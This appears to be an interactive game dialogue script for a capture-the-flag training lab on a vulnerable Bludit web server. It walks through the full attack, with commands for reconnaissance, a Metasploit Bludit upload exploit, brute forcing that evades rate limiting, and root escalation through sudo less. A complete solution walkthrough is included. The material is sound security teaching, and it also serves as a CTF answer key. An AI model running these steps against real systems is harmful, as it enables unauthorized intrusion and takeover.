// Feeling Blu Challenge - Web Security CTF Lab Sheet
// Based on HacktivityLabSheets: introducing_attacks/9_feeling_blu.md
// Author: Anatoliy Gorbenko, Z. Cliffe Schreuders, Andrew Scholey
// License: CC BY-SA 4.0

// Global persistent state
VAR instructor_rapport = 0
VAR ctf_mastery = 0
VAR challenge_mode = "guided" // "guided" or "ctf"

// Global variables (synced from scenario.json.erb)
VAR player_name = "Agent 0x00"

=== start ===
~ instructor_rapport = 0
~ ctf_mastery = 0

Welcome back, {player_name}. What would you like to discuss?

-> feeling_blu_hub

// ===========================================
// TIMED INTRO CONVERSATION (Game Start)
// ===========================================

=== intro_timed ===
~ instructor_rapport = 0
~ ctf_mastery = 0

Welcome to the "Feeling Blu" CTF Challenge, {player_name}. I'm your CTF Challenge Coordinator for this comprehensive Capture The Flag challenge.

This is your final test - a comprehensive challenge that brings together everything you've learned. You'll exploit a web server, gain access, escalate privileges, and hunt for flags. This simulates a real-world penetration test from start to finish.

Let me explain how this lab works. You'll find three key resources here:

First, there's a Lab Sheet Workstation in this room. This gives you access to detailed written instructions and exercises that complement our conversation. Use it to follow along with the material.

Second, in the VM lab room to the north, you'll find terminals to launch virtual machines. You'll work with both a Kali Linux attacker machine and a vulnerable web server for hands-on practice.

Finally, there's a Flag Submission Terminal where you'll submit flags you capture during the exercises. These flags demonstrate that you've successfully completed the challenges.

You can talk to me anytime to explore CTF concepts, get tips, or ask questions about the material. I'm here to help guide your learning.

Before we begin, you need to choose how you want to approach this challenge. Would you like guided mode with step-by-step instructions, or pure CTF mode with minimal guidance?

-> choose_path

// ===========================================
// MAIN HUB
// ===========================================

=== feeling_blu_hub ===
{challenge_mode == "ctf": -> ctf_mode_hub | -> guided_mode_hub}

=== choose_path ===
How do you want to tackle this CTF challenge?

+ [Pure CTF mode - minimal guidance, maximum challenge]
    ~ challenge_mode = "ctf"
    ~ ctf_mastery += 20
    #influence_increased
    Excellent choice! You'll get the full Capture The Flag experience.

    I'll give you the tools and objectives, but you'll need to figure out the approach yourself.

    Use everything you've learned: scanning, exploitation, privilege escalation, and persistence.

    Only come back for hints if you're truly stuck. Good luck!

    -> ctf_mode_hub

+ [Guided mode - walk me through the techniques]
    ~ challenge_mode = "guided"
    ~ instructor_rapport += 10
    #influence_increased
    A wise choice for learning! I'll guide you through each phase with explanations.

    You'll learn web application exploitation, brute forcing, post-exploitation, and privilege escalation with structured guidance.

    This approach ensures you understand not just how to exploit, but why each technique works.

    -> guided_mode_hub

=== ctf_mode_hub ===
This is CTF mode - you're on your own! Here's what I can tell you:

Target: A web server running on your victim VM.

Objectives: Find multiple flags, gain shell access, escalate to root.

Tools available: Nmap, Dirb, Nikto, Metasploit, OWASP ZAP, and more.

+ [What tools should I start with?]
    Think about the attack methodology: reconnaissance, scanning, exploitation, post-exploitation, privilege escalation.

    Start by discovering what's running: Nmap for services, Dirb and Nikto for web enumeration.

    Look for hidden files, admin panels, and leaked credentials.

    ~ instructor_rapport += 5
    #influence_increased

+ [I'm stuck - give me a hint about reconnaissance]
    -> ctf_recon_hints

+ [I'm stuck - give me a hint about exploitation]
    -> ctf_exploit_hints

+ [I'm stuck - give me a hint about privilege escalation]
    -> ctf_privesc_hints

+ [Tell me about the web security tools]
    -> web_tools_intro

+ [I want to switch to guided mode]
    -> switch_to_guided

+ [I'm done - show me the solution walkthrough]
    -> guided_mode_hub

+ [That's all for now]
    #exit_conversation
    -> guided_mode_hub

=== ctf_recon_hints ===
Alright, here's a hint for reconnaissance:

Start with Nmap to identify services and versions: nmap \-sV TARGET_IP

Use Dirb to find hidden directories: dirb http://TARGET_IP

Use Nikto for web vulnerabilities: nikto \-h http://TARGET_IP

Look carefully at discovered files - some contain very useful information about usernames and passwords!

The CMS being used might have known exploits. Identify what CMS is running.

~ instructor_rapport += 5
#influence_increased

-> ctf_mode_hub

=== ctf_exploit_hints ===
Here's a hint for exploitation:

You should have discovered Bludit CMS running on the server.

Search Metasploit for Bludit exploits: search bludit

You'll need both a username and password - these might have been leaked in hidden files.

If you only have the username, consider brute-forcing the password using OWASP ZAP.

The Bludit vulnerability allows arbitrary code execution and should give you a Meterpreter shell.

~ instructor_rapport += 5
#influence_increased

-> ctf_mode_hub

=== ctf_privesc_hints ===
Here's a hint for privilege escalation:

After gaining initial access, check what sudo commands your user can run: sudo \-l

If your user can run certain commands with sudo, look for ways to escape from those commands to get a root shell.

The 'less' command is particularly interesting - it can execute shell commands with !<command>

If you can run 'less' with sudo, you can escape to a root shell!

~ instructor_rapport += 5
#influence_increased

-> ctf_mode_hub

=== switch_to_guided ===
Switching to guided mode. I'll walk you through the complete solution.

~ challenge_mode = "guided"

-> guided_mode_hub

=== guided_mode_hub ===
Welcome to guided mode. I'll walk you through each phase of the challenge.

+ [Part 1: Information gathering and reconnaissance]
    -> phase_1_recon

+ [Part 2: Exploitation and gaining access]
    -> phase_2_exploitation

+ [Part 3: Optional - Brute forcing with OWASP ZAP]
    -> phase_3_bruteforce

+ [Part 4: Post-exploitation and flag hunting]
    -> phase_4_post_exploit

+ [Part 5: Privilege escalation to root]
    -> phase_5_privesc

+ [Tell me about web security tools first]
    -> web_tools_intro

+ [Show me the complete solution]
    -> complete_walkthrough

+ [Switch to CTF mode (no more guidance)]
    ~ challenge_mode = "ctf"
    -> ctf_mode_hub

+ [That's all for now]
    #exit_conversation
    -> guided_mode_hub

=== web_tools_intro ===
Let me introduce the key web security tools you'll need.

~ instructor_rapport += 5
#influence_increased

Dirb is a web content scanner that finds hidden files and directories using dictionary attacks.

Nikto is a web vulnerability scanner that checks for dangerous files, outdated software, and misconfigurations.

OWASP ZAP is an intercepting proxy that lets you capture, modify, and replay HTTP requests - perfect for brute forcing.

+ [How do I use Dirb?]
    Dirb is straightforward: dirb http://TARGET_IP

    It uses a built-in dictionary to test common paths like /admin/, /backup/, /config/, etc.

    Pay attention to discovered files - they often contain credentials or sensitive configuration data.

    Right-click discovered URLs to open them in your browser and examine their contents.

    ~ instructor_rapport += 5
    #influence_increased

+ [How do I use Nikto?]
    Nikto scans for web vulnerabilities: nikto \-h http://TARGET_IP

    It checks for over 6,000 security issues including dangerous files, server misconfigurations, and known vulnerabilities.

    The output shows each finding with references for more information.

    Nikto results help you understand what attacks might be successful.

    ~ instructor_rapport += 5
    #influence_increased

+ [How do I use OWASP ZAP?]
    OWASP ZAP acts as a proxy between your browser and the web server.

    It intercepts HTTP requests and responses, allowing you to modify and replay them.

    This is incredibly useful for brute forcing login forms, especially those with CSRF protection.

    You can also use it to bypass IP-based rate limiting with the X-Forwarded-For header.

    ~ instructor_rapport += 5
    #influence_increased

{challenge_mode == "ctf": -> ctf_mode_hub | -> guided_mode_hub}

=== phase_1_recon ===
Phase 1 is all about information gathering - discovering what you're dealing with before launching attacks.

~ instructor_rapport += 5
#influence_increased

The attack methodology follows this sequence: reconnaissance, scanning, exploitation, post-exploitation, and privilege escalation.

Each phase builds on the previous, so thorough reconnaissance is crucial.

+ [What should I scan for?]
    Start with network reconnaissance: nmap \-sV TARGET_IP

    This identifies open ports, running services, and software versions.

    Then scan the web application: dirb http://TARGET_IP

    Follow up with: nikto \-h http://TARGET_IP

    Look for admin panels, configuration files, backup files, and anything that might contain credentials.

    ~ instructor_rapport += 5
    #influence_increased

+ [What am I looking for specifically?]
    You're looking for several things:

    What CMS (Content Management System) is running? This tells you what exploits might work.

    Are there leaked credentials in discovered files? Check text files, logs, and backups.

    Is there an admin login page? You might need to access it.

    What server software and versions are running? This helps identify known vulnerabilities.

    There's also a flag hidden in one of the discovered files!

    ~ instructor_rapport += 5
    #influence_increased

+ [Walk me through the reconnaissance process]
    Here's the step-by-step process:

    1. Run Nmap: nmap \-sV \-p- TARGET_IP (scan all ports with version detection)

    2. Run Dirb: dirb http://TARGET_IP (find hidden directories and files)

    3. Run Nikto: nikto \-h http://TARGET_IP (identify web vulnerabilities)

    4. Browse discovered URLs - open them in Firefox to see what they contain

    5. Look for patterns: usernames on the website, admin pages, leaked files

    6. Document everything - the CMS name, discovered usernames, any found credentials

    The reconnaissance might reveal Bludit CMS with an admin login at /admin/

    ~ instructor_rapport += 5
    #influence_increased

- -> guided_mode_hub

=== phase_2_exploitation ===
Phase 2 is exploitation - using discovered vulnerabilities to gain access.

~ instructor_rapport += 5
#influence_increased

Based on your reconnaissance, you should have identified Bludit CMS running on the server.

Bludit has known vulnerabilities that we can exploit using Metasploit.

+ [How do I find Bludit exploits?]
    In Metasploit, search for Bludit: search bludit

    You'll find several modules. Look for ones related to code execution or file upload.

    Use info to read about each exploit: info exploit/linux/http/bludit_upload_images_exec

    This particular exploit allows arbitrary code execution through image upload functionality.

    ~ instructor_rapport += 5
    #influence_increased

+ [What do I need to exploit Bludit?]
    The Bludit exploit requires several pieces of information:

    RHOSTS: The target IP address

    BLUDITUSER: The Bludit admin username (should have been discovered during recon)

    BLUDITPASS: The admin password (might have been leaked, or you'll need to brute force it)

    TARGETURI: Typically / (the root of the web server)

    The exploit will give you a Meterpreter shell if successful!

    ~ instructor_rapport += 5
    #influence_increased

+ [What if I don't have the password?]
    If you found the username but not the password, you have options:

    Check all discovered files thoroughly - passwords are sometimes leaked in config files or backups

    If truly not found, you can brute force it using OWASP ZAP (covered in optional Phase 3)

    Bludit has CSRF protection and rate limiting, making brute forcing tricky but possible

    ~ instructor_rapport += 5
    #influence_increased

+ [Walk me through the exploitation]
    Here's the complete exploitation process:

    1. Start Metasploit: msfconsole

    2. Search: search bludit

    3. Use the upload_images exploit: use exploit/linux/http/bludit_upload_images_exec

    4. Show options: show options

    5. Set target: set RHOSTS TARGET_IP

    6. Set username: set BLUDITUSER admin (or discovered username)

    7. Set password: set BLUDITPASS <discovered_password>

    8. Run exploit: exploit

    If successful, you'll get a Meterpreter shell! This is your foothold in the system.

    ~ instructor_rapport += 5
    #influence_increased

- -> guided_mode_hub

=== phase_3_bruteforce ===
Phase 3 is optional - brute forcing the Bludit password if you only have the username.

~ instructor_rapport += 5
#influence_increased

Bludit has protections against brute forcing: CSRF tokens and IP-based rate limiting.

OWASP ZAP can bypass these protections with the right configuration.

+ [How does CSRF protection work?]
    CSRF (Cross-Site Request Forgery) tokens are randomly generated by the server.

    The server sends a token in each response, and the client must include it in the next request.

    This prevents simple replay attacks because each request needs the current token.

    OWASP ZAP can extract tokens from responses and insert them into requests automatically.

    ~ instructor_rapport += 5
    #influence_increased

+ [How does rate limiting protection work?]
    After a certain number of failed login attempts from the same IP, Bludit blocks that IP temporarily.

    You'll see messages like "Too many incorrect attempts. Try again in 30 minutes."

    However, we can bypass this using the X-Forwarded-For HTTP header.

    By randomizing the X-Forwarded-For IP, we make each attempt appear to come from a different client.

    ~ instructor_rapport += 5
    #influence_increased

+ [Walk me through the ZAP brute force process]
    This is complex, so pay attention:

    1. Launch OWASP ZAP and configure it as a proxy

    2. Install the random_x_forwarded_for_ip.js script from the ZAP community scripts

    3. Browse to the Bludit login page through ZAP

    4. Attempt a login to capture the HTTP request in ZAP's history

    5. Right-click the POST request and select "Fuzz..."

    6. Select the password field and add a payload with common passwords

    7. Add the X-Forwarded-For script as a message processor

    8. Launch the fuzzer and look for different HTTP response codes

    Successful logins typically return 301 or 302 (redirect) instead of 200 (error message).

    ~ instructor_rapport += 5
    #influence_increased

- -> guided_mode_hub

=== phase_4_post_exploit ===
Phase 4 is post-exploitation - exploring the compromised system and hunting for flags.

~ instructor_rapport += 5
#influence_increased

You should have a Meterpreter shell from the exploitation phase.

Now it's time to explore the system, understand your access level, and find flags.

+ [What Meterpreter commands should I use?]
    Essential Meterpreter commands for exploration:

    getuid - Shows your current username

    sysinfo - System information (OS, architecture, etc.)

    pwd - Print working directory

    ls - List files in current directory

    cat filename - Read file contents

    cd /path - Change directory

    shell - Drop to OS shell (Ctrl-C to return to Meterpreter)

    ~ instructor_rapport += 5
    #influence_increased

+ [Where should I look for flags?]
    Flags are hidden in various locations:

    Check your current directory - there might be a flag right where you land

    Look in user home directories: /home/username/

    Different users might have different flags

    Eventually, you'll need to check /root/ but that requires privilege escalation

    Some flags might be in encrypted files - note encryption hints for later

    ~ instructor_rapport += 5
    #influence_increased

+ [How do I switch users?]
    To switch users, you need to drop to an OS shell first:

    From Meterpreter, run: shell

    Now you have a Linux shell. Use: su username

    However, you'll need the user's password to switch

    If you discovered the Bludit admin user's password earlier, you can switch to that user

    Return to Meterpreter with Ctrl-C when done

    ~ instructor_rapport += 5
    #influence_increased

- -> guided_mode_hub

=== phase_5_privesc ===
Phase 5 is privilege escalation - gaining root access to fully control the system.

~ instructor_rapport += 5
#influence_increased

Your initial shell is likely running as the www-data user (the web server user) with limited privileges.

To access all system files and read flags in /root/, you need to escalate to root.

+ [How do I check my privileges?]
    From a shell, check your privileges:

    whoami - Shows your username

    id - Shows UID, GID, and groups

    sudo \-l - Lists commands you can run with sudo

    Note: You might need a proper TTY terminal first: python3 -c 'import pty; pty.spawn("/bin/bash")'

    This spawns a proper terminal that sudo will accept.

    ~ instructor_rapport += 5
    #influence_increased

+ [What's the sudo privilege escalation method?]
    When you run sudo \-l, you'll see what commands you can run as root.

    If you can run /usr/bin/less with sudo, that's your ticket to root!

    The 'less' command is a pager for viewing files, but it can also execute shell commands.

    When viewing a file with less, press ! followed by a command to execute it.

    Since less is running with sudo privileges, any command you run will execute as root!

    ~ instructor_rapport += 5
    #influence_increased

+ [Walk me through getting root access]
    Here's the complete privilege escalation process:

    1. Drop to shell from Meterpreter: shell

    2. Spawn a proper terminal: python3 -c 'import pty; pty.spawn("/bin/bash")'

    3. Check sudo permissions: sudo \-l

    4. You should see you can run less on a specific file

    5. Run that command with sudo: sudo /usr/bin/less /path/to/file

    6. When the file is displayed, type: !id

    7. You should see uid=0 (root!) in the output

    8. Now type: !/bin/bash

    9. You now have a root shell! Verify with: whoami

    Now you can access /root/ and find the final flags!

    ~ instructor_rapport += 5
    #influence_increased

- -> guided_mode_hub

=== complete_walkthrough ===
Here's the complete solution walkthrough from start to finish:

~ instructor_rapport += 10
#influence_increased
~ ctf_mastery += 20
#influence_increased

Phase 1 - Reconnaissance:

nmap \-sV \-p- TARGET_IP

dirb http://TARGET_IP

nikto \-h http://TARGET_IP

Browse discovered files, find admin login at /admin/, discover Bludit CMS, find leaked credentials

Phase 2 - Exploitation:

msfconsole

search bludit

use exploit/linux/http/bludit_upload_images_exec

set RHOSTS TARGET_IP

set BLUDITUSER admin (or discovered username)

set BLUDITPASS discovered_password

exploit

Phase 3 - Post-Exploitation:

getuid, sysinfo, ls, cat flag.txt (in current directory)

shell

su bludit_admin (with discovered password)

cat ~/flag.txt (in that user's home)

Phase 4 - Privilege Escalation:

python3 -c 'import pty; pty.spawn("/bin/bash")'

sudo \-l (discover you can run less on a specific file)

sudo /usr/bin/less /path/to/file

!id (verify root)

!/bin/bash (spawn root shell)

cd /root && ls (find final flags)

That's the complete solution! Try to replicate it yourself now that you understand the approach.

-> guided_mode_hub

